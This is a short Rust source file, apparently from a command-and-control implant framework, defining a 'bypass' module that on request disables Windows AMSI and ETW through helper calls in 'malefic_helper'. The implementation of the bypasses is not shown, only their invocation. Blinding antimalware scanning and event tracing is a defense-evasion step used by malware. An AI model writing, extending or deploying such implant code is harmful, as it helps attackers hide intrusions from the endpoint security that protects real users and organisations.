use crate::prelude::*;

pub struct Bypass {}

#[async_trait]
#[module_impl("bypass")]
impl Module for Bypass {}

#[async_trait]
impl ModuleImpl for Bypass {
    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::BypassRequest)?;
        unsafe {
            if req.amsi {
                malefic_helper::win::kit::bypass::bypass_amsi();
            }
            if req.etw {
                malefic_helper::win::kit::bypass::bypass_etw();
            }
        }

        Ok(TaskResult::new(id))
    }
}